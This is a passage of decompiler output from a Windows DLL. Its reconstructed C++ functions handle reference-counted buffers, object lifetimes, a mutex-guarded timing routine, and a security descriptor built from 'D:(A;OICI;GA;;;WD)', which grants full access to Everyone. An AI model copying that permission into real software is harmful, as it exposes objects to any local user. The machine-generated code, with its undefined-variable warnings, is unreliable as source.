    *this = &unk_100FC1FC;
    if ( a2 )
      v4 = (int)a2 + *(_DWORD *)(*a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 2, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100FC1F4;
  this[1] = a2[1];
  return this;
}
// 100FC1F4: using guessed type int (__stdcall *off_100FC1F4)(char);

//----- (1000AA7B) --------------------------------------------------------
char *__thiscall sub_1000AA7B(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 2);
  sub_1000A814(this - 2);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000AA9A) --------------------------------------------------------
BOOL __usercall sub_1000AA9A@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 != -1 && v1;
}

//----- (1000AAAD) --------------------------------------------------------
int __stdcall sub_1000AAAD(int a1, _DWORD *a2)
{
  void *v2; // eax
  int v3; // edi
  _DWORD *v4; // eax

  *(_DWORD *)a1 = off_100FC2C8;
  *(_BYTE *)(a1 + 4) = 1;
  sub_1000D372((_DWORD *)(a1 + 8), (int)&unk_1018667C);
  v2 = operator new(0x2Cu);
  if ( v2 )
    v3 = sub_10012225(a2, (int)v2);
  else
    v3 = 0;
  v4 = operator new(4u);
  if ( v4 )
    *v4 = 1;
  else
    v4 = 0;
  *(_DWORD *)(a1 + 20) = v4;
  *(_DWORD *)(a1 + 16) = v3;
  return a1;
}
// 100FC2C8: using guessed type int (*off_100FC2C8[5])();

//----- (1000AB3C) --------------------------------------------------------
void *__thiscall sub_1000AB3C(void *Block, char a2)
{
  sub_1000308F((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AB59) --------------------------------------------------------
void __thiscall sub_1000AB59(int this, void *a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  int v5[5]; // [esp+8h] [ebp-28h] BYREF
  void *Block; // [esp+1Ch] [ebp-14h]
  int v7; // [esp+20h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  Block = operator new(0x2Cu);
  v8 = 0;
  if ( Block )
  {
    v3 = (_DWORD *)sub_1000B1F3(a2, (int)v5, 0);
    LOBYTE(v8) = 1;
    v7 = 1;
    v4 = sub_10012225(v3, (int)Block);
  }
  else
  {
    v4 = 0;
  }
  v8 = 2;
  sub_1000AD9F((_DWORD *)(this + 16), v4);
  v8 = -1;
  if ( (v7 & 1) != 0 )
  {
    v7 &= ~1u;
    sub_1000B3DF(v5);
  }
  *(_BYTE *)(this + 4) = 1;
}
// 1000AB59: using guessed type int var_28[5];

//----- (1000ABE4) --------------------------------------------------------
_DWORD *__thiscall sub_1000ABE4(int this)
{
  _DWORD *v2; // eax
  _DWORD *result; // eax
  _DWORD v4[4]; // [esp+8h] [ebp-10h] BYREF

  if ( !*(_BYTE *)(this + 4) )
  {
    v2 = sub_1000E7F7(v4, 1, 0);
    v4[3] = 0;
    sub_10007882((int)v2);
  }
  result = sub_1000AD9F((_DWORD *)(this + 16), 0);
  *(_BYTE *)(this + 4) = 0;
  return result;
}

//----- (1000AC2D) --------------------------------------------------------
char __thiscall sub_1000AC2D(_BYTE *this)
{
  return this[4];
}

//----- (1000AC31) --------------------------------------------------------
void *__thiscall sub_1000AC31(_BYTE *this)
{
  void *result; // eax
  _DWORD *v2; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  result = &loc_100A37EF;
  v3[0] = this;
  if ( !this[4] )
  {
    v2 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v2);
  }
  return result;
}

//----- (1000AC66) --------------------------------------------------------
void *__thiscall sub_1000AC66(_BYTE *this)
{
  void *result; // eax
  _DWORD *v2; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  result = &loc_100A37EF;
  v3[0] = this;
  if ( !this[4] )
  {
    v2 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v2);
  }
  return result;
}

//----- (1000AC9B) --------------------------------------------------------
int __thiscall sub_1000AC9B(int this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return *(_DWORD *)(this + 16);
}

//----- (1000ACD3) --------------------------------------------------------
int __thiscall sub_1000ACD3(int this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return *(_DWORD *)(this + 16) != 0 ? *(_DWORD *)(this + 16) + 8 : 0;
}

//----- (1000AD14) --------------------------------------------------------
_DWORD *__thiscall sub_1000AD14(void *this, _DWORD *a2)
{
  sub_1000D372(a2, (int)this + 8);
  return a2;
}

//----- (1000AD4B) --------------------------------------------------------
int __thiscall sub_1000AD4B(int this)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  if ( !*(_BYTE *)(this + 4) )
  {
    v1 = sub_1000E7F7(v3, 1, 0);
    v3[3] = 0;
    sub_10007882((int)v1);
  }
  return *(_DWORD *)(*(_DWORD *)(this + 16) + 40);
}

//----- (1000AD86) --------------------------------------------------------
void __thiscall sub_1000AD86(_DWORD *this, void *a2)
{
  _DWORD *v2; // esi

  v2 = (_DWORD *)this[4];
  sub_10012502(v2, a2);
  v2[10] = a2;
}

//----- (1000AD9F) --------------------------------------------------------
_DWORD *__usercall sub_1000AD9F@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_100B012F;
  if ( *a1 != a2 )
  {
    sub_100081D1((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}

//----- (1000ADE9) --------------------------------------------------------
_DWORD *__stdcall sub_1000ADE9(_DWORD *a1)
{
  sub_100131B5((int)a1);
  *a1 = &off_100FC2F8;
  return a1;
}
// 100FC2F8: using guessed type int (__thiscall *off_100FC2F8)(void *Block, char);

//----- (1000AE1D) --------------------------------------------------------
int *__thiscall sub_1000AE1D(int *Block, char a2)
{
  sub_1000AE39(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AE39) --------------------------------------------------------
void __thiscall sub_1000AE39(int *this)
{
  *this = (int)&off_100FC2F8;
  sub_10013553(this);
}
// 100FC2F8: using guessed type int (__thiscall *off_100FC2F8)(void *Block, char);

//----- (1000AE67) --------------------------------------------------------
int __thiscall sub_1000AE67(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 96))(this);
}

//----- (1000AE6C) --------------------------------------------------------
_DWORD *__stdcall sub_1000AE6C(_DWORD *a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  sub_1000ADE9(a1);
  v3 = lpAddend;
  a1[26] = 0;
  v4 = a2;
  *a1 = &off_100FC360;
  a1[28] = v3;
  a1[27] = v4;
  InterlockedIncrement(v3);
  sub_10007D7A((void **)&a2);
  return a1;
}
// 100FC360: using guessed type int (__thiscall *off_100FC360)(void *Block, char);

//----- (1000AEC2) --------------------------------------------------------
void *__thiscall sub_1000AEC2(void *Block, char a2)
{
  sub_1000AEDE((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000AEDE) --------------------------------------------------------
void __thiscall sub_1000AEDE(int this)
{
  *(_DWORD *)this = &off_100FC360;
  sub_10007D7A((void **)(this + 108));
  sub_1000AE39((int *)this);
}
// 100FC360: using guessed type int (__thiscall *off_100FC360)(void *Block, char);

//----- (1000AF19) --------------------------------------------------------
int __stdcall sub_1000AF19(int a1)
{
  int v1; // edi
  _DWORD *v2; // esi
  int v3; // eax
  volatile LONG *v5; // ecx
  int v6; // edi
  int v7; // esi
  int *v8; // eax
  volatile LONG *v9; // [esp-8h] [ebp-98h] BYREF
  volatile LONG *v10; // [esp-4h] [ebp-94h]
  int v11; // [esp+4h] [ebp-8Ch] BYREF
  int v12[7]; // [esp+10h] [ebp-80h] BYREF
  int v13[7]; // [esp+2Ch] [ebp-64h] BYREF
  int v14[7]; // [esp+48h] [ebp-48h] BYREF
  __time64_t Time; // [esp+64h] [ebp-2Ch] BYREF
  __time64_t v16; // [esp+6Ch] [ebp-24h] BYREF
  int v17[4]; // [esp+74h] [ebp-1Ch] BYREF
  int v18; // [esp+8Ch] [ebp-4h]

  v17[3] = (int)&v11;
  v18 = 0;
  _time64(&Time);
  sub_1000D17D(v17, &word_1017A56C);
  LOBYTE(v18) = 1;
  v1 = *(_DWORD *)dword_101842F4;
  v2 = (_DWORD *)(a1 + 108);
  if ( (*(int (__thiscall **)(int))(*(_DWORD *)(*(_DWORD *)(a1 + 108) + 4) + 4))(*(_DWORD *)(a1 + 108) + 4) )
  {
    v3 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*v2 + 4) + 44))(*v2 + 4, 0);
    if ( v1 != StrToIntW(*(PCWSTR *)(*(_DWORD *)(v3 + 4) + 12)) )
    {
      LOBYTE(v18) = 0;
      sub_1000D3AD(v17);
      return 1;
    }
  }
  sub_1000132C(v14);
  LOBYTE(v18) = 2;
  v6 = v1 - 1001;
  if ( v6 )
  {
    if ( v6 != 1 )
    {
      v7 = 1;
      v17[2] = 1;
      LOBYTE(v18) = 0;
LABEL_7:
      sub_1000D3AD(v17);
      return v7;
    }
    v10 = v5;
    v9 = v5;
    sub_1000A205(v2, &v9);
    LOBYTE(v18) = 2;
    v8 = sub_1002950F(v13, (int)v17, (int)v9, v10);
  }
  else
  {
    v8 = sub_1002D064((int)v17, v12);
  }
  qmemcpy(v14, v8, sizeof(v14));
  v18 = 1;
  _time64(&v16);
  v14[1] = v16 - Time;
  HIBYTE(v14[6]) = 49;
  if ( !sub_1000D687((int)v17) )
  {
    v7 = v14[0];
    LOBYTE(v18) = 0;
    goto LABEL_7;
  }
  sub_10029F42((int)v17, v14, (void *)0x1C);
  LOBYTE(v18) = 0;
  sub_1000D3AD(v17);
  v18 = 6;
  SetEvent(hHandle);
  CoUninitialize();
  v18 = -1;
  return 0;
}
// 1000AFCF: variable 'v5' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;
// 1000AF19: using guessed type int var_64[7];
// 1000AF19: using guessed type int var_80[7];

//----- (1000B0AF) --------------------------------------------------------
int __thiscall sub_1000B0AF(void *this)
{
  int v3; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+Ch] [ebp-14h]
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = &v3;
  v6 = 0;
  if ( WaitForSingleObjectEx(hMutex, 0, 1) )
    return 1;
  v4 = sub_1000AF19((int)this);
  if ( !ReleaseMutex(hMutex) )
    return 1;
  v6 = -1;
  return v4;
}

//----- (1000B119) --------------------------------------------------------
LONG __usercall sub_1000B119@<eax>(int a1@<esi>)
{
  LONG result; // eax

  result = InterlockedDecrement((volatile LONG *)(a1 + 4));
  if ( !result )
  {
    if ( a1 )
      return (**(int (__thiscall ***)(int, int))a1)(a1, 1);
  }
  return result;
}

//----- (1000B134) --------------------------------------------------------
int __userpurge sub_1000B134@<eax>(void *a1@<eax>, int a2@<ecx>, void *a3)
{
  *(_DWORD *)(a2 + 4) = 0;
  *(_BYTE *)(a2 + 8) = 1;
  *(_DWORD *)a2 = &off_100FC3C8;
  sub_1000B1C2(a1, a2, a3);
  return a2;
}
// 100FC3C8: using guessed type int (__thiscall *off_100FC3C8)(void *Block, char);

//----- (1000B157) --------------------------------------------------------
_DWORD *__thiscall sub_1000B157(_DWORD *Block, char a2)
{
  sub_1000B177(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B177) --------------------------------------------------------
void __stdcall sub_1000B177(_DWORD *a1)
{
  void *v1; // eax
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *a1 = &off_100FC3C8;
  v2[6] = 0;
  v1 = (void *)a1[3];
  if ( v1 )
    j__free(v1);
}
// 100FC3C8: using guessed type int (__thiscall *off_100FC3C8)(void *Block, char);

//----- (1000B1C2) --------------------------------------------------------
void *__userpurge sub_1000B1C2@<eax>(void *result@<eax>, int a2@<esi>, void *Src)
{
  *(_DWORD *)(a2 + 12) = 0;
  *(_DWORD *)(a2 + 16) = result;
  if ( result )
  {
    result = operator new((size_t)result);
    *(_DWORD *)(a2 + 12) = result;
    if ( Src )
      return memcpy(result, Src, *(_DWORD *)(a2 + 16));
  }
  return result;
}

//----- (1000B1F3) --------------------------------------------------------
int __userpurge sub_1000B1F3@<eax>(void *a1@<ebx>, int a2, void *a3)
{
  void *v3; // ecx
  int v4; // eax

  *(_DWORD *)a2 = off_100FC3C4;
  v3 = operator new(0x14u);
  v4 = 0;
  if ( v3 )
    v4 = sub_1000B134(a1, (int)v3, a3);
  *(_DWORD *)(a2 + 4) = v4;
  sub_1000B7EC((LONG *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = a1;
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 100FC3C4: using guessed type int (__thiscall *off_100FC3C4[2])(void *, char);

//----- (1000B261) --------------------------------------------------------
int __userpurge sub_1000B261@<eax>(int a1@<ebx>, int a2, char a3)
{
  size_t v3; // eax
  int v4; // eax
  size_t v5; // eax
  void *v7; // [esp-4h] [ebp-1Ch]
  void *v8; // [esp+8h] [ebp-10h]

  *(_DWORD *)a2 = off_100FC3C4;
  v8 = operator new(0x14u);
  if ( v8 )
  {
    v7 = *(void **)(*(_DWORD *)(a1 + 4) + 12);
    v3 = sub_1000D687(a1);
    v4 = sub_1000B134((void *)(2 * ((a3 != 0) + v3)), (int)v8, v7);
  }
  else
  {
    v4 = 0;
  }
  *(_DWORD *)(a2 + 4) = v4;
  sub_1000B7EC((LONG *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = 0;
  v5 = sub_1000D687(a1);
  *(_BYTE *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 12) = 2 * ((a3 != 0) + v5);
  return a2;
}
// 100FC3C4: using guessed type int (__thiscall *off_100FC3C4[2])(void *, char);

//----- (1000B2FA) --------------------------------------------------------
int __userpurge sub_1000B2FA@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4, void *Block)
{
  int v5; // eax

  *(_DWORD *)a2 = off_100FC3C4;
  *(_DWORD *)(a2 + 4) = a1[1];
  sub_1000B7EC((LONG *)(a2 + 4), Block);
  *(_DWORD *)(a2 + 8) = a3 + a1[2];
  *(_DWORD *)(a2 + 12) = a4;
  *(_BYTE *)(a2 + 16) = (_BYTE)Block;
  if ( (unsigned int)(a4 + a3) > a1[3] )
  {
    v5 = sub_1000E7F7(1, 0);
    sub_10007882(v5);
  }
  return a2;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 100FC3C4: using guessed type int (__thiscall *off_100FC3C4[2])(void *, char);

//----- (1000B36F) --------------------------------------------------------
int __userpurge sub_1000B36F@<eax>(_DWORD *a1@<ebx>, int a2)
{
  *(_DWORD *)a2 = off_100FC3C4;
  *(_DWORD *)(a2 + 4) = a1[1];
  sub_1000B7EC((LONG *)(a2 + 4), 0);
  *(_DWORD *)(a2 + 8) = a1[2];
  *(_DWORD *)(a2 + 12) = a1[3];
  *(_BYTE *)(a2 + 16) = 0;
  return a2;
}
// 100FC3C4: using guessed type int (__thiscall *off_100FC3C4[2])(void *, char);

//----- (1000B3BD) --------------------------------------------------------
int __usercall sub_1000B3BD@<eax>(LONG *a1@<edi>, int a2@<esi>)
{
  if ( a1 != (LONG *)a2 )
  {
    sub_1000B7C9(a1 + 1, (LONG *)(a2 + 4));
    *(_DWORD *)(a2 + 8) = a1[2];
    *(_DWORD *)(a2 + 12) = a1[3];
    *(_BYTE *)(a2 + 16) = 0;
  }
  return a2;
}

//----- (1000B3DF) --------------------------------------------------------
void __thiscall sub_1000B3DF(int *this)
{
  *this = (int)off_100FC3C4;
  sub_10012C9D(this + 1);
}
// 100FC3C4: using guessed type int (__thiscall *off_100FC3C4[2])(void *, char);

//----- (1000B40C) --------------------------------------------------------
void *__usercall sub_1000B40C@<eax>(int a1@<ecx>, int a2@<esi>)
{
  void *result; // eax
  int v3; // ebx
  void *v4; // ecx
  int v5; // eax
  int v6; // [esp+0h] [ebp-10h] BYREF
  int v7; // [esp+Ch] [ebp-4h]

  result = &loc_100A6A73;
  v6 = a1;
  if ( !*(_BYTE *)(a2 + 16) )
  {
    v3 = a2 + 4;
    if ( *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) > 1u )
    {
      v4 = operator new(0x14u);
      v6 = (int)v4;
      v7 = 0;
      if ( v4 )
        v5 = sub_1000B134(*(void **)(a2 + 12), (int)v4, (void *)(*(_DWORD *)(a2 + 8) + *(_DWORD *)(*(_DWORD *)v3 + 12)));
      else
        v5 = 0;
      v7 = -1;
      v6 = v5;
      sub_1000B7EC(&v6, 0);
      v7 = 1;
      sub_1000B7C9(&v6, (LONG *)(a2 + 4));
      v7 = -1;
      sub_10012C9D(&v6);
      *(_DWORD *)(a2 + 8) = 0;
    }
    result = *(void **)v3;
    *(_BYTE *)(*(_DWORD *)v3 + 8) = 0;
  }
  return result;
}

//----- (1000B49B) --------------------------------------------------------
int __usercall sub_1000B49B@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  if ( !a1[3] )
    return 0;
  sub_1000B40C(a2, (int)a1);
  return a1[2] + *(_DWORD *)(a1[1] + 12);
}

//----- (1000B4B8) --------------------------------------------------------
int __thiscall sub_1000B4B8(_DWORD *this)
{
  if ( this[3] )
    return this[2] + *(_DWORD *)(this[1] + 12);
  else
    return 0;
}

//----- (1000B4CB) --------------------------------------------------------
int __userpurge sub_1000B4CB@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  sub_1000B40C(a2, a1);
  return a3 + *(_DWORD *)(a1 + 8) + *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12);
}

//----- (1000B4E7) --------------------------------------------------------
bool __fastcall sub_1000B4E7(_DWORD *a1, _DWORD *a2)
{
  size_t v2; // eax
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7; // edx
  size_t Size; // [esp+0h] [ebp-4h]

  v2 = a2[3];
  Size = v2;
  if ( v2 != a1[3] )
    return 0;
  if ( !v2 )
    return 1;
  v4 = a1[1];
  v5 = a1[2];
  v6 = a2[1];
  v7 = a2[2];
  return v7 + *(_DWORD *)(v6 + 12) == v5 + *(_DWORD *)(v4 + 12)
      || memcmp((const void *)(v7 + *(_DWORD *)(v6 + 12)), (const void *)(v5 + *(_DWORD *)(v4 + 12)), Size) == 0;
}

//----- (1000B544) --------------------------------------------------------
int __usercall sub_1000B544@<eax>(_DWORD *a1@<ecx>, int a2@<esi>)
{
  void *v2; // ebx
  void *v4; // eax
  void *v5; // ebx
  void *v6; // eax
  void *v7; // ecx
  void *v8; // eax
  const void *v9; // eax
  int v10; // edx
  int v11; // edi
  const void *v12; // eax
  size_t v14; // [esp-4h] [ebp-44h]
  size_t v15; // [esp-4h] [ebp-44h]
  int v16[5]; // [esp+8h] [ebp-38h] BYREF
  int v17[3]; // [esp+1Ch] [ebp-24h] BYREF
  size_t Size; // [esp+28h] [ebp-18h]
  void *Block; // [esp+30h] [ebp-10h] BYREF
  int v20; // [esp+3Ch] [ebp-4h]

  v2 = *(void **)(a2 + 12);
  v4 = (void *)sub_1000B4B8((_DWORD *)a2);
  sub_1000B1F3(v2, (int)v17, v4);
  v20 = 0;
  v5 = (void *)a1[3];
  v6 = (void *)sub_1000B4B8(a1);
  sub_1000B1F3(v5, (int)v16, v6);
  LOBYTE(v20) = 1;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) += a1[3];
  v7 = operator new(0x14u);
  Block = v7;
  LOBYTE(v20) = 2;
  if ( v7 )
    v8 = (void *)sub_1000B134(*(void **)(a2 + 12), (int)v7, 0);
  else
    v8 = 0;
  LOBYTE(v20) = 1;
  Block = v8;
  sub_1000B7EC((LONG *)&Block, 0);
  LOBYTE(v20) = 3;
  sub_1000B7C9((LONG *)&Block, (LONG *)(a2 + 4));
  LOBYTE(v20) = 1;
  sub_10012C9D((int *)&Block);
  v14 = Size;
  v9 = (const void *)sub_1000B4B8(v17);
  memcpy(*(void **)(v10 + 12), v9, v14);
  v11 = *(_DWORD *)(a2 + 4);
  v15 = v16[3];
  v12 = (const void *)sub_1000B4B8(v16);
  memcpy((void *)(Size + *(_DWORD *)(v11 + 12)), v12, v15);
  LOBYTE(v20) = 0;
  sub_1000B3DF(v16);
  v20 = -1;
  sub_1000B3DF(v17);
  return a2;
}
// 1000B5EE: variable 'v10' is possibly undefined
// 1000B544: using guessed type int var_24[3];

//----- (1000B63D) --------------------------------------------------------
int __usercall sub_1000B63D@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3)
{
  sub_1000B36F(a1, a2);
  sub_1000B544(a3, a2);
  return a2;
}

//----- (1000B67C) --------------------------------------------------------
int __userpurge sub_1000B67C@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4)
{
  sub_1000B2FA(a1, a2, a3, a4, 0);
  return a2;
}

//----- (1000B6B7) --------------------------------------------------------
int __userpurge sub_1000B6B7@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4)
{
  sub_1000B2FA(a1, a2, a3, a4, (void *)1);
  return a2;
}

//----- (1000B6F2) --------------------------------------------------------
int __thiscall sub_1000B6F2(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_1000B4B8(this);
  memcpy(&a2, (const void *)(a2 + v2), sizeof(a2));
  return a2;
}

//----- (1000B713) --------------------------------------------------------
_BYTE *__userpurge sub_1000B713@<eax>(int a1@<ecx>, _DWORD *a2@<esi>, int a3, int Src)
{
  char v4; // bl
  int v5; // eax
  _BYTE *result; // eax

  v4 = *(_BYTE *)(a2[1] + 8);
  v5 = sub_1000B49B(a2, a1);
  result = memcpy((void *)(a3 + v5), &Src, 4u);
  if ( v4 )
  {
    result = (_BYTE *)a2[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000B746) --------------------------------------------------------
__int16 __thiscall sub_1000B746(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_1000B4B8(this);
  memcpy(&a2, (const void *)(a2 + v2), 2u);
  return a2;
}

//----- (1000B768) --------------------------------------------------------
_BYTE *__userpurge sub_1000B768@<eax>(int a1@<ecx>, _DWORD *a2@<esi>, int a3, __int16 Src)
{
  char v4; // bl
  int v5; // eax
  _BYTE *result; // eax

  v4 = *(_BYTE *)(a2[1] + 8);
  v5 = sub_1000B49B(a2, a1);
  result = memcpy((void *)(a3 + v5), &Src, 2u);
  if ( v4 )
  {
    result = (_BYTE *)a2[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000B79B) --------------------------------------------------------
_BYTE *__usercall sub_1000B79B@<eax>(int a1@<ecx>, _DWORD *a2@<esi>)
{
  char v2; // bl
  _BYTE *result; // eax
  void *v4; // eax
  size_t v5; // [esp-4h] [ebp-8h]

  v2 = *(_BYTE *)(a2[1] + 8);
  result = (_BYTE *)a2[3];
  if ( result )
  {
    v5 = a2[3];
    v4 = (void *)sub_1000B49B(a2, a1);
    result = memset(v4, 0, v5);
  }
  if ( v2 )
  {
    result = (_BYTE *)a2[1];
    result[8] = 1;
  }
  return result;
}

//----- (1000B7C9) --------------------------------------------------------
LONG *__usercall sub_1000B7C9@<eax>(LONG *a1@<eax>, LONG *a2@<ecx>)
{
  LONG v2; // eax
  int v4; // esi

  v2 = *a1;
  v4 = *a2;
  if ( *a2 != v2 )
  {
    *a2 = v2;
    sub_1000B7EC(a2, 0);
    if ( v4 )
      sub_1000B119(v4);
  }
  return a2;
}

//----- (1000B7EC) --------------------------------------------------------
LONG __userpurge sub_1000B7EC@<eax>(LONG *a1@<edi>, void *Block)
{
  LONG result; // eax
  _DWORD *v3; // esi
  LONG v4; // eax

  result = *a1;
  if ( *a1 )
  {
    if ( !*(_BYTE *)(result + 8) && !(_BYTE)Block )
    {
      v3 = operator new(0x14u);
      if ( v3 )
      {
        v4 = *a1;
        v3[1] = 0;
        *((_BYTE *)v3 + 8) = 1;
        *v3 = &off_100FC3C8;
        sub_1000B1C2(*(void **)(v4 + 16), (int)v3, *(void **)(v4 + 12));
      }
      else
      {
        v3 = 0;
      }
      *a1 = (LONG)v3;
    }
    return InterlockedIncrement((volatile LONG *)(*a1 + 4));
  }
  return result;
}
// 100FC3C8: using guessed type int (__thiscall *off_100FC3C8)(void *Block, char);

//----- (1000B85E) --------------------------------------------------------
_DWORD *__thiscall sub_1000B85E(_DWORD *Block, char a2)
{
  sub_1000B9EB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000B87D) --------------------------------------------------------
_DWORD *__cdecl sub_1000B87D(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v2; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  _DWORD *v6; // eax
  int v8; // [esp+Ch] [ebp-20h] BYREF
  int v9[2]; // [esp+10h] [ebp-1Ch] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+18h] [ebp-14h] BYREF
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  v1 = operator new(0xCu);
  v2 = (int)v1;
  v9[1] = (int)v1;
  v12 = 1;
  if ( v1 )
  {
    *v1 = &off_101022E8;
    v3 = operator new(0xCu);
    *(_DWORD *)(v2 + 4) = v3;
    *(_BYTE *)(v2 + 8) = 0;
    *v3 = 12;
    *(_DWORD *)(*(_DWORD *)(v2 + 4) + 8) = 0;
    *(_DWORD *)(*(_DWORD *)(v2 + 4) + 4) = 0;
  }
  else
  {
    v2 = 0;
  }
  sub_10050B91(a1, v2);
  v12 = 0;
  v11 = 1;
  v4 = sub_1000BA38(v9);
  v12 = 2;
  v5 = !ConvertStringSecurityDescriptorToSecurityDescriptorW(*(LPCWSTR *)(v4[1] + 12), 1u, &SecurityDescriptor, 0);
  LOBYTE(v12) = 0;
  sub_1000D3AD(v9);
  if ( v5 )
  {
    v6 = sub_1000E9DF(&v8, 1, 1);
    v12 = 3;
    sub_1000A947(v6, 39);
  }
  *(_DWORD *)(*(_DWORD *)(*a1 + 4) + 4) = SecurityDescriptor;
  *(_BYTE *)(*a1 + 8) = 1;
  return a1;
}
// 101022E8: using guessed type int (__thiscall *off_101022E8)(void *Block, char);

//----- (1000B964) --------------------------------------------------------
_DWORD *__cdecl sub_1000B964(_DWORD *a1)
{
  _DWORD *v1; // eax

  v1 = operator new(0xCu);
  if ( v1 )
  {
    *v1 = &off_101022E8;
    v1[1] = 0;
    *((_BYTE *)v1 + 8) = 0;
  }
  else
  {
    v1 = 0;
  }
  sub_10050B91(a1, (int)v1);
  return a1;
}
// 101022E8: using guessed type int (__thiscall *off_101022E8)(void *Block, char);

//----- (1000B9C0) --------------------------------------------------------
_DWORD *__usercall sub_1000B9C0@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax

  result = *(_DWORD **)(a1 + 4);
  if ( result )
  {
    result = (_DWORD *)result[1];
    if ( result )
    {
      if ( *(_BYTE *)(a1 + 8) )
        LocalFree(result);
      else
        j__free(result);
      result = *(_DWORD **)(a1 + 4);
      result[1] = 0;
    }
  }
  return result;
}

//----- (1000B9EB) --------------------------------------------------------
void __thiscall sub_1000B9EB(_DWORD *this)
{
  void *v2; // esi
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  v3[3] = v3;
  *this = &off_101022E8;
  v3[6] = 0;
  sub_1000B9C0((int)this);
  v2 = (void *)this[1];
  if ( v2 )
    j__free(v2);
}
// 101022E8: using guessed type int (__thiscall *off_101022E8)(void *Block, char);

//----- (1000BA38) --------------------------------------------------------
_DWORD *__cdecl sub_1000BA38(_DWORD *a1)
{
  sub_1000D17D(a1, (wchar_t *)L"D:(A;OICI;GA;;;WD)");
  return a1;
}

//----- (1000BA6E) --------------------------------------------------------
_DWORD *__userpurge sub_1000BA6E@<eax>(
        int a1@<ebx>,
        int a2@<edi>,
        _DWORD *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        volatile LONG *lpAddend)
{
  volatile LONG *v8; // eax
  int v9; // ecx

  a3[1] = -1;
  *a3 = &off_10102310;
  sub_1000D372(a3 + 2, a4);
  v8 = lpAddend;
  v9 = a7;
  a3[4] = a2;
  a3[6] = v8;
  a3[5] = v9;
  InterlockedIncrement(v8);
  a3[7] = a5;
  if ( a1 == -1 )
    a3[8] = 3;
  else
    a3[8] = a1;
  if ( a6 != -1 )
  {
    a3[9] = a6;
    goto LABEL_15;
  }
  switch ( a2 )
  {
    case -2147483648:
    case -2147483392:
      goto LABEL_13;
    case -1073741824:
      a3[9] = 4;
      break;
    case 0:
    case 256:
LABEL_13:
      a3[9] = 3;
      break;
    case 1073741824:
      a3[9] = 2;
      break;
  }
LABEL_15:
  sub_10007D7A((void **)&a7);
  return a3;
}
// 10102310: using guessed type int (__thiscall *off_10102310)(void *Block, char);

//----- (1000BB35) --------------------------------------------------------
void *__thiscall sub_1000BB35(void *Block, char a2)
{
  sub_1000BB54((int)Block);
  if ( (a2 & 1) != 0 )
